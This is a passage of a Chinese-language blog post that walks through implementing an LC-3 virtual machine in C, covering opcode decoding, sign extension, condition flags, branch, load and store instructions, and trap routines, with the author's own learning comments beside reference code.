OP_JUMP,<span class="comment">//JUMP </span></span><br><span class="line">	OP_RES,<span class="comment">//RESERVED(UNUSED)</span></span><br><span class="line">	OP_LEA,<span class="comment">//LOAD EFFECTIVE ADDRESS 加载有效地址</span></span><br><span class="line">	OP_TRAP<span class="comment">//EXECUTE TRAP 执行陷阱指令</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="条件标志位"><a href="#条件标志位" class="headerlink" title="条件标志位"></a>条件标志位</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    FL_POS = <span class="number">1</span> &lt;&lt; <span class="number">0</span>, <span class="comment">/* P */</span>    <span class="comment">//正数  0001</span></span><br><span class="line">    FL_ZRO = <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="comment">/* Z */</span>    <span class="comment">//零    0010</span></span><br><span class="line">    FL_NEG = <span class="number">1</span> &lt;&lt; <span class="number">2</span>, <span class="comment">/* N */</span>    <span class="comment">//负数   0100</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>硬件的模拟完成。</p>
<h1 id="执行程序"><a href="#执行程序" class="headerlink" title="执行程序"></a>执行程序</h1><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><ol>
<li>从PC寄存器指向的内存地址中加载一条指令</li>
<li>递增PC寄存器（指向下一条命令）</li>
<li>查看指令的操作码，判断指令类型</li>
<li>根据指令类型和指令中的参数执行该指令</li>
<li>跳转到第一步</li>
</ol>
<p>这个过程一点也不陌生和x86机器一摸一样。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    &#123;Load Arguments, <span class="number">12</span>&#125;</span><br><span class="line">    &#123;Setup, <span class="number">12</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* set the PC to starting position */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> PC_START = <span class="number">0x3000</span> &#125;; <span class="comment">/* 0x3000 is the default */</span></span><br><span class="line">    reg[R_PC] = PC_START;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> running = <span class="number">1</span>;   </span><br><span class="line">    <span class="keyword">while</span> (running) &#123;</span><br><span class="line">        <span class="type">uint16_t</span> instr = mem_read(reg[R_PC]++); <span class="comment">/* FETCH */</span> <span class="comment">//步骤一、步骤二</span></span><br><span class="line">        <span class="type">uint16_t</span> op = instr &gt;&gt; <span class="number">12</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (op) &#123;      <span class="comment">//步骤三、四</span></span><br><span class="line">            <span class="keyword">case</span> OP_ADD: &#123;ADD, <span class="number">6</span>&#125; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_AND: &#123;AND, <span class="number">7</span>&#125; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_NOT: &#123;NOT, <span class="number">7</span>&#125; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_BR: &#123;BR, <span class="number">7</span>&#125; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_JMP: &#123;JMP, <span class="number">7</span>&#125; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_JSR: &#123;JSR, <span class="number">7</span>&#125; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_LD: &#123;LD, <span class="number">7</span>&#125; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_LDI: &#123;LDI, <span class="number">6</span>&#125; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_LDR: &#123;LDR, <span class="number">7</span>&#125; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_LEA: &#123;LEA, <span class="number">7</span>&#125; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_ST: &#123;ST, <span class="number">7</span>&#125; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_STI: &#123;STI, <span class="number">7</span>&#125; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_STR: &#123;STR, <span class="number">7</span>&#125; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_TRAP: &#123;TRAP, <span class="number">8</span>&#125; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> OP_RES:</span><br><span class="line">            <span class="keyword">case</span> OP_RTI:</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                &#123;BAD OPCODE, <span class="number">7</span>&#125;    </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#123;Shutdown, <span class="number">12</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这就是主要框架，接下来的任务就是具体的写出每一个指令实现了什么功能。详单与我们去完善一些函数。</p>
<h1 id="指令实现"><a href="#指令实现" class="headerlink" title="指令实现"></a>指令实现</h1><p>在这里我们描述指令如何运行</p>
<h3 id="ADD指令"><a href="#ADD指令" class="headerlink" title="ADD指令"></a>ADD指令</h3><p>ADD 指令将两个数相加，然后将结果存到一个寄存器中。</p>
<p>有两种格式：ADD R2 R0 R1  ；ADD R0 R0 1 第一种是将R0+R2存储到R2,第二种是将R0+1存到R0。</p>
<p><img src="/2023/05/21/%E7%BC%96%E5%86%99%E8%99%9A%E6%8B%9F%E6%9C%BA/QQ%E6%88%AA%E5%9B%BE20230518214834.png"></p>
<p>第二种方式我们可以看出立即数只有五位，我们得把它加载到一个16bit的空间上，这就涉及到有符号扩展，这部分内容CSAPP第二章讲的很详细，对于正数我们直接给高位填充0即可，对于负数，由于是用补码表示，所以我们将高位填充1,举个例子：</p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"> <span class="comment">5</span><span class="literal">--</span>&gt;<span class="comment">0101</span><span class="literal">--</span>&gt;<span class="comment">0000 0101</span></span><br><span class="line"><span class="literal">-</span><span class="comment">5</span><span class="literal">--</span>&gt;<span class="comment">1011</span><span class="literal">--</span>&gt;<span class="comment">1111 1011</span> </span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint16_t</span> <span class="title function_">sign_extend</span><span class="params">(<span class="type">uint16_t</span> x, <span class="type">int</span> bit_count)</span> &#123;  <span class="comment">//实现有符号扩展</span></span><br><span class="line">    <span class="keyword">if</span> ((x &gt;&gt; (bit_count - <span class="number">1</span>)) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">        x |= (<span class="number">0xFFFF</span> &lt;&lt; bit_count);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>每次使用ADD都会涉及到寄存器值的改变，每当改变发生我们都要更新标志寄存器</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">update_flags</span><span class="params">(<span class="type">uint16_t</span> r)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(reg[r]==<span class="number">0</span>)&#123;</span><br><span class="line">        reg[R_COND]=FL_ZRO;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (reg[r] &gt;&gt; <span class="number">15</span>) &#123; <span class="comment">//查看符号位</span></span><br><span class="line">        reg[R_COND] = FL_NEG;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        reg[R_COND] = FL_POS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现ADD的逻辑</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> r0=(instr&gt;&gt;<span class="number">9</span>)&amp;<span class="number">0x7</span>;<span class="comment">//只看9到11位，即目的寄存器</span></span><br><span class="line">    <span class="type">uint16_t</span> r1=(instr&gt;&gt;<span class="number">6</span>)&amp;<span class="number">0x7</span>;<span class="comment">//第一个参数 寄存器编号</span></span><br><span class="line">    <span class="type">uint16_t</span> imm_flag=(instr&gt;&gt;<span class="number">5</span>)&amp;<span class="number">1</span>;<span class="comment">//查看第五位从而确定最后一个参数是寄存器还是立即数</span></span><br><span class="line">    <span class="keyword">if</span>(imm_flag)&#123;<span class="comment">//立即数模式</span></span><br><span class="line">        <span class="type">uint16_t</span> imm5=sign_extend(instr&amp;<span class="number">0x1f</span>,<span class="number">5</span>);<span class="comment">//短于16bit的值进行符号扩展</span></span><br><span class="line">        reg[r0]=reg[r1]+imm5;    </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;       <span class="comment">//寄存器模式</span></span><br><span class="line">        <span class="type">uint16_t</span> r2=instr&amp;<span class="number">0x7</span>;</span><br><span class="line">        reg[r0]=reg[r1]+reg[r2];</span><br><span class="line">    &#125;</span><br><span class="line">    update_flags(r0);<span class="comment">//查看计算的结果并更新标志寄存器</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这就是完整的ADD啦，小巧而精悍。</p>
<h3 id="LDI指令"><a href="#LDI指令" class="headerlink" title="LDI指令"></a>LDI指令</h3><p>LDI 是 load indirect 的缩写，用于从内存加载一个值到寄存器。感觉和x86里面的mov与lea（load effective address)相似。 LDI 的二进制格式如下：</p>
<p><img src="/2023/05/21/%E7%BC%96%E5%86%99%E8%99%9A%E6%8B%9F%E6%9C%BA/QQ%E6%88%AA%E5%9B%BE20230519000010.png"></p>
<p>实现逻辑是这样的：0-8是内存地址，将程序计数器寄存器的值加上此值，pc自加1，自加1之后的PC就是加载地址，取出该内存单元的值，将其放入9-11位所表示的寄存器中，这个0-8，也就是能够表示一个9bit的地址，我们的内存是16位的，所以显然LDI指令只能对附近的一些内存单元进行操作，这在x86中也有体现，当时只是知道一些指令只能进行段内跳转，这还是相对跳转hhh，现在清楚了为什么是远眺转为什么是近跳转。“可以将它想想成 C 中有一个局部变 量，这变量是指向某些数据的指针”，C语言中的局部变量也是因为距离的原因不能作用于全局嘛？？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> r0=(instr&gt;&gt;<span class="number">9</span>)&amp;<span class="number">0x7</span>;<span class="comment">//取目的寄存器</span></span><br><span class="line">    <span class="type">uint16_t</span> pc_offset=sign_extend(instr&amp;<span class="number">0x1ff</span>,<span class="number">9</span>);<span class="comment">//符号扩展，第一个参数是该数的位，第二个参数描述长度</span></span><br><span class="line">   reg[r0]=men_read(mem_read(reg[R_PC]+pc_offset));<span class="comment">//读取指定内存地址处的值加载入目的寄存器</span></span><br><span class="line">    update_flags(r0);<span class="comment">//更新标志寄存器</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Bitwise-and-（按位与）"><a href="#Bitwise-and-（按位与）" class="headerlink" title="Bitwise and （按位与）"></a>Bitwise and （按位与）</h3><p>AND和上面的ADD一样，也有两种模式即立即模式和寄存器模式。照着葫芦画瓢就行。</p>
<p><img src="/2023/05/21/%E7%BC%96%E5%86%99%E8%99%9A%E6%8B%9F%E6%9C%BA/QQ%E6%88%AA%E5%9B%BE20230519160042.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> r0=(instr&gt;&gt;<span class="number">9</span>)&amp;<span class="number">0x7</span>;<span class="comment">//目的寄存器</span></span><br><span class="line">    <span class="type">uint16_t</span> r1=(instr&gt;&gt;<span class="number">6</span>)&amp;<span class="number">0x7</span>;<span class="comment">//寄存器编号</span></span><br><span class="line">    <span class="type">uint16_t</span> imm_flag=(instr&gt;&gt;<span class="number">5</span>)&amp;<span class="number">0x1</span>;<span class="comment">//确定模式</span></span><br><span class="line">    <span class="keyword">if</span>(imm_flag)&#123;</span><br><span class="line">        <span class="type">uint16_t</span> imm5=sign_extend(instr&amp;<span class="number">0x1f</span>,<span class="number">5</span>);</span><br><span class="line">        reg[r0]=reg[r1]&amp;imm5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="type">uint16_t</span> r2=instr&amp;<span class="number">0x7</span>;</span><br><span class="line">        reg[r0]=reg[r1]&amp;reg[r2];</span><br><span class="line">    &#125;</span><br><span class="line">    update_flags(r0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实就是把ADD代码里的+换成了&amp;这么简单。</p>
<h3 id="Bitwise-not（按位非）"><a href="#Bitwise-not（按位非）" class="headerlink" title="Bitwise not（按位非）"></a>Bitwise not（按位非）</h3><p>位上的0变1，1变0；</p>
<p><img src="/2023/05/21/%E7%BC%96%E5%86%99%E8%99%9A%E6%8B%9F%E6%9C%BA/QQ%E6%88%AA%E5%9B%BE20230519162611.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> r0=(instr&gt;&gt;<span class="number">9</span>)&amp;<span class="number">0x7</span>;<span class="comment">//目的寄存器</span></span><br><span class="line">    <span class="type">uint16_t</span> r1=(instr&gt;&gt;<span class="number">6</span>)&amp;<span class="number">0x7</span>;<span class="comment">//寄存器编号</span></span><br><span class="line">    reg[r0]=~reg[r1];</span><br><span class="line">    update_flags(r0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Branch（条件分支）"><a href="#Branch（条件分支）" class="headerlink" title="Branch（条件分支）"></a>Branch（条件分支）</h3><p>11-9所示的三位分别代表负数、零、正数，当n被设置为1的时候，就会检测条件码寄存器的值是否为FL_NEG，如果相等则跳转，其余两位原理相同。可以进行一些组合，比如设置为011则代表如果最近一次寄存器中的值更改为0或正数都会进行跳转。特殊的，如果设置为000则不进行检测，无条件跳转。（这里为什么不设置成111，这样无论正数负数还是0都会进行跳转啊），至于如何跳转，就是进行pc&#x3D;pc+pccoffset9.那这样进行排列组合的话就有八种可能。</p>
<p><img src="/2023/05/21/%E7%BC%96%E5%86%99%E8%99%9A%E6%8B%9F%E6%9C%BA/QQ%E6%88%AA%E5%9B%BE20230519163705.png"></p>
<p>我的狗屎代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> n=(instr&gt;&gt;<span class="number">11</span>)&amp;<span class="number">0x1</span>;</span><br><span class="line">    <span class="type">uint16_t</span> z=(instr&gt;&gt;<span class="number">10</span>)&amp;<span class="number">0x1</span>;</span><br><span class="line">    <span class="type">uint16_t</span> p=(instr&gt;&gt;<span class="number">9</span>)&amp;<span class="number">0x1</span>;</span><br><span class="line">    <span class="type">uint16_t</span> pc_offset=sign_extend(instr&amp;<span class="number">0x1ff</span>,<span class="number">9</span>);</span><br><span class="line">    <span class="type">uint16_t</span> nzp=(instr&gt;&gt;<span class="number">9</span>)&amp;<span class="number">0x7</span>;<span class="comment">//000 001 010 011 100 101 110 111</span></span><br><span class="line">    <span class="keyword">if</span>(nzp==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        reg[R_PC]=reg[R_PC]+pc_offset;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(nzp==<span class="number">1</span>)</span><br><span class="line">    &#123;<span class="comment">//判断是否为正数</span></span><br><span class="line">        <span class="keyword">if</span>(reg[R_COND]==FL_POS)</span><br><span class="line">        &#123;</span><br><span class="line">            reg[R_PC]=reg[R_PC]+pc_offset;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(nzp==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">////////////这样一个个的判断当然不是不行，可就是这八种情况少说也得有70行代码，我觉得应该不会如此臃肿，果然，作者的实现只用了5行代码woc</span></span><br></pre></td></tr></table></figure>

<p>作者代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> pc_offset=sign_extend(instr&amp;<span class="number">0x1ff</span>,<span class="number">9</span>);</span><br><span class="line">    <span class="type">uint16_t</span> cond_flag=(instr&gt;&gt;<span class="number">9</span>)&amp;<span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">if</span>(cond_flag&amp;reg[R_COND])&#123;</span><br><span class="line">        reg[R_PC]+=pc_offset;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最精华的部分是在 if(cond_flag&amp;reg[R_COND])这里，太精华了，这样一看代码果然前面的那个无条件跳转是将nzp三位设置成111而不是000.从这一步也可以解释当时条件码为什么要用移位符号那样设置。</p>
<h3 id="Jump（跳转）"><a href="#Jump（跳转）" class="headerlink" title="Jump（跳转）"></a>Jump（跳转）</h3><p><img src="/2023/05/21/%E7%BC%96%E5%86%99%E8%99%9A%E6%8B%9F%E6%9C%BA/QQ%E6%88%AA%E5%9B%BE20230519163639.png"></p>
<blockquote>
<p>RET 在规范中作为一个单独的指令列出，因为在汇编中它是一个独立的关键字。但是，RET 本质上是 JMP 的一个特殊情况。当 R1 为 7 时会执行 RET。</p>
</blockquote>
<p>无条件的跳转到寄存器指示的位置。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> r0=(instr&gt;&gt;<span class="number">6</span>)&amp;<span class="number">0x7</span>;</span><br><span class="line">    reg[R_PC]=reg[r0];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Jump-Register（跳转寄存器）"><a href="#Jump-Register（跳转寄存器）" class="headerlink" title="Jump Register（跳转寄存器）"></a>Jump Register（跳转寄存器）</h3><p>也是两种情况。根据文章的解释将它理解为x86里的call指令应该没什么不妥，毕竟他首先将下一条指令存到了寄存器rR7中，这对应了push ip操作吧。JSR模式：将pc加上pccoffset11；JSSR模式：将pc设置为寄存器的值。一个是远眺转一个是进跳转吧。</p>
<p><img src="/2023/05/21/%E7%BC%96%E5%86%99%E8%99%9A%E6%8B%9F%E6%9C%BA/QQ%E6%88%AA%E5%9B%BE20230519175718.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> imm_flag=(instr&gt;&gt;<span class="number">11</span>)&amp;<span class="number">0x1</span>;</span><br><span class="line">    <span class="type">uint16_t</span> long_pc_offset = sign_extend(instr &amp; <span class="number">0x7ff</span>, <span class="number">11</span>);</span><br><span class="line">    <span class="type">uint16_t</span> long_flag = (instr &gt;&gt; <span class="number">11</span>) &amp; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    reg[R_R7] = reg[R_PC];</span><br><span class="line">    <span class="keyword">if</span> (long_flag) &#123;</span><br><span class="line">        reg[R_PC] += long_pc_offset;  <span class="comment">/* JSR */</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        reg[R_PC] = reg[r1]; <span class="comment">/* JSRR */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;<span class="comment">//终止包含他的循环，并执行下一阶段。结束这次的switch</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个最后为什么要加上个break呀，在模板里break不是统一加在了最后吗，去掉应该没啥问题。</p>
<h3 id="Load（加载）"><a href="#Load（加载）" class="headerlink" title="Load（加载）"></a>Load（加载）</h3><p>相对地址在后面的pc段，用相对寻址的方法取得目的地址存放的数据，载入目的寄存器中。</p>
<p><img src="/2023/05/21/%E7%BC%96%E5%86%99%E8%99%9A%E6%8B%9F%E6%9C%BA/QQ%E6%88%AA%E5%9B%BE20230519195058.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> r0=(instr&gt;&gt;<span class="number">9</span>)&amp;<span class="number">0x7</span>;</span><br><span class="line">    <span class="type">uint16_t</span> pc_coffset=sign_extend(instr&amp;<span class="number">0x1ff</span>,<span class="number">9</span>);</span><br><span class="line">    reg[r0]=mem_read(reg[R_PC]+pc_coffset);</span><br><span class="line">    update_flags(r0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Load-Register（加载寄存器）"><a href="#Load-Register（加载寄存器）" class="headerlink" title="Load Register（加载寄存器）"></a>Load Register（加载寄存器）</h3><p><img src="/2023/05/21/%E7%BC%96%E5%86%99%E8%99%9A%E6%8B%9F%E6%9C%BA/QQ%E6%88%AA%E5%9B%BE20230519200825.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="type">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="type">uint16_t</span> offset = sign_extend(instr &amp; <span class="number">0x3F</span>, <span class="number">6</span>);</span><br><span class="line">    reg[r0] = mem_read(reg[r1] + offset);</span><br><span class="line">    update_flags(r0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Load-Effective-Address（加载有效地址）"><a href="#Load-Effective-Address（加载有效地址）" class="headerlink" title="Load Effective Address（加载有效地址）"></a>Load Effective Address（加载有效地址）</h3><p>和load小小不同</p>
<p><img src="/2023/05/21/%E7%BC%96%E5%86%99%E8%99%9A%E6%8B%9F%E6%9C%BA/QQ%E6%88%AA%E5%9B%BE20230519200522.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> r0=(instr&gt;&gt;<span class="number">9</span>)&amp;<span class="number">0x7</span>;</span><br><span class="line">    <span class="type">uint16_t</span> pc_coffset=sign_extend(instr&amp;<span class="number">0x1ff</span>,<span class="number">9</span>);</span><br><span class="line">    reg[r0]=reg[R_PC]+pc_coffset;</span><br><span class="line">    update_flags(r0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Store（存储）"><a href="#Store（存储）" class="headerlink" title="Store（存储）"></a>Store（存储）</h3><p>将寄存器中的值存储到我们指定的内存单元</p>
<p><img src="/2023/05/21/%E7%BC%96%E5%86%99%E8%99%9A%E6%8B%9F%E6%9C%BA/QQ%E6%88%AA%E5%9B%BE20230519201159.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="type">uint16_t</span> pc_offset = sign_extend(instr &amp; <span class="number">0x1ff</span>, <span class="number">9</span>);</span><br><span class="line">    mem_write(reg[R_PC] + pc_offset, reg[r0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Store-Indirect（间接存储）"><a href="#Store-Indirect（间接存储）" class="headerlink" title="Store Indirect（间接存储）"></a>Store Indirect（间接存储）</h3><p><img src="/2023/05/21/%E7%BC%96%E5%86%99%E8%99%9A%E6%8B%9F%E6%9C%BA/QQ%E6%88%AA%E5%9B%BE20230519201743.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="type">uint16_t</span> pc_offset = sign_extend(instr &amp; <span class="number">0x1ff</span>, <span class="number">9</span>);</span><br><span class="line">    mem_write(mem_read(reg[R_PC] + pc_offset), reg[r0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Store-Register（存储寄存器）"><a href="#Store-Register（存储寄存器）" class="headerlink" title="Store Register（存储寄存器）"></a>Store Register（存储寄存器）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="type">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="type">uint16_t</span> offset = sign_extend(instr &amp; <span class="number">0x3F</span>, <span class="number">6</span>);</span><br><span class="line">    mem_write(reg[r1] + offset, reg[r0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="涉及到的一些函数"><a href="#涉及到的一些函数" class="headerlink" title="涉及到的一些函数"></a>涉及到的一些函数</h2><h3 id="mem-read"><a href="#mem-read" class="headerlink" title="mem_read()"></a>mem_read()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint16_t</span> <span class="title function_">mem_read</span><span class="params">(<span class="type">uint16_t</span> address)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (address == MR_KBSR) &#123;</span><br><span class="line">        <span class="keyword">if</span> (check_key()) &#123;</span><br><span class="line">            memory[MR_KBSR] = (<span class="number">1</span> &lt;&lt; <span class="number">15</span>);</span><br><span class="line">            memory[MR_KBDR] = getchar();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            memory[MR_KBSR] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> memory[address];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="mem-write"><a href="#mem-write" class="headerlink" title="mem_write()"></a>mem_write()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mem_write</span><span class="params">(<span class="type">uint16_t</span> address, <span class="type">uint16_t</span> val)</span> &#123;</span><br><span class="line">    memory[address] = val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="中断陷入例程"><a href="#中断陷入例程" class="headerlink" title="中断陷入例程"></a>中断陷入例程</h2><p>这是什么，和之前接触的内中断、外中断一回事吗？</p>
<blockquote>
<p>LC-3 提供了几个预定于的函数（过程），用于执行常规任务以及与 I&#x2F;O 设备交换， 例如，用于从键盘接收输入的函数，在控制台上显示字符串的函数。这些都称为 trap routines，你可以将它们当做操作系统或者是 LC-3 的 API。 每个 trap routine 都有一个对应的 trap code（中断号）。要执行一次捕获， 需要用相应的 trap code 执行 <code>TRAP</code> 指令。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    TRAP_GETC = <span class="number">0x20</span>,  <span class="comment">/* 从键盘获取字符，不在终端回显 */</span></span><br><span class="line">    TRAP_OUT = <span class="number">0x21</span>,   <span class="comment">/* 输出一个字符 */</span></span><br><span class="line">    TRAP_PUTS = <span class="number">0x22</span>,  <span class="comment">/* 输出一个字符串 */</span></span><br><span class="line">    TRAP_IN = <span class="number">0x23</span>,    <span class="comment">/* 从键盘获取字符，并在终端回显 */</span></span><br><span class="line">    TRAP_PUTSP = <span class="number">0x24</span>, <span class="comment">/* 输出一个字节字符串*/</span></span><br><span class="line">    TRAP_HALT = <span class="number">0x25</span>   <span class="comment">/* 停止程序运行 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>“字节字符串”（Byte String）是由多个字节组成的序列，每个字节都有8位。字节字符串不像字符串那样直接包含可读的字符，而是用于表示各种类型的信息，如图像、声音、视频、压缩文件等。在字节字符串中，单独的字节没有特定的意义，而是需要根据上下文来解释。</p>
</blockquote>
<p>逻辑：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (instr &amp; <span class="number">0xFF</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> TRAP_GETC: &#123;TRAP GETC, <span class="number">9</span>&#125; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> TRAP_OUT: &#123;TRAP OUT, <span class="number">9</span>&#125; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> TRAP_PUTS: &#123;TRAP PUTS, <span class="number">8</span>&#125; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> TRAP_IN: &#123;TRAP IN, <span class="number">9</span>&#125; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> TRAP_PUTSP: &#123;TRAP PUTSP, <span class="number">9</span>&#125; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> TRAP_HALT: &#123;TRAP HALT, <span class="number">9</span>&#125; <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PUTS"><a href="#PUTS" class="headerlink" title="PUTS"></a>PUTS</h3><p><code>PUT</code> trap code 用于输出一个以空字符结尾的字符串（和 C 中的 <code>printf</code> 类似）显示一个字符串需要将这个字符串的地址放到 <code>R0</code> 寄存器，然后触发 trap。</p>
<p>将字符串存储到一个连续的内存区域。由于LC-3内存寻址是16位的，所以打印之前需要先将内存中的值转换为char类型再输出。</p>
